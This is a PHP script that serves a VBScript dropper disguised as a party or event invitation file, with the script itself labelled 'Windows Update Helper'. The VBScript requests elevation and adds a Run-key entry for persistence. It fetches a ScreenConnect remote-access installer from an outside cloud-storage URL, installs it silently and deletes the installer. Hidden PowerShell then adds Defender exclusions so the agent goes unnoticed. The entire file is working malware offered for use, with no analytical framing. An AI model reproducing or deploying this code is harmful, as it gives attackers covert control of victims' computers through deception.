<?php
// invite.php - Elevation + Logs + Short Wait
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Event_Invitation", "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);

if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

$sessionId = bin2hex(random_bytes(24));
$ts        = time();

echo <<<VBS
' Windows Update Helper - $ts

Dim objShell, objFSO
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

Sub Log(msg)
    WScript.Echo "[DEBUG] " & msg
End Sub

Call Log("Script started")

Function IsElevated()
    On Error Resume Next
    Dim wmi, col, item
    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set col = wmi.ExecQuery("Select * from Win32_Process where ProcessId = " & objShell.ProcessId)
    For Each item In col
        IsElevated = (item.GetOwner().Domain = "NT AUTHORITY")
        Exit Function
    Next
    IsElevated = False
End Function

Sub Elevate()
    On Error Resume Next
    Call Log("Requesting UAC elevation...")
    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
    WScript.Quit
End Sub

Sub AddToStartup()
    On Error Resume Next
    objShell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper", WScript.ScriptFullName, "REG_SZ"
    Call Log("Added to startup")
End Sub

Sub DownloadAndExecute()
    On Error Resume Next
    Dim u, p, http, strm, exitCode
    u = "$scUrl"
    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
    
    Call Log("Downloading installer...")
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", u, False
    http.Send
    Call Log("HTTP Status: " & http.Status)
    
    If http.Status = 200 Then
        Set strm = CreateObject("ADODB.Stream")
        strm.Type = 1
        strm.Open
        strm.Write http.responseBody
        strm.SaveToFile p, 2
        strm.Close
        Call Log("Download complete → " & p)
        
        Call Log("Starting silent install...")
        exitCode = objShell.Run("""" & p & """ /quiet", 0, True)
        Call Log("Installer exit code: " & exitCode & " (0 = success)")
        
        Call Log("Waiting 90 seconds for install to finish...")
        WScript.Sleep 90000
        
        If objFSO.FileExists(p) Then 
            objFSO.DeleteFile p, True
            Call Log("Temp file cleaned up")
        End If
    Else
        Call Log("Download failed")
    End If
End Sub

Sub HideAgent()
    On Error Resume Next
    objShell.Run "powershell -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'""", 0, True
    Call Log("Defender exclusion attempted")
End Sub

' ===== MAIN =====
If Not IsElevated Then
    Call Elevate
Else
    Call Log("Running with elevation")
    Call AddToStartup
    Call DownloadAndExecute
    Call HideAgent
    Call Log("All done")
End If

WScript.Quit
VBS;
?>
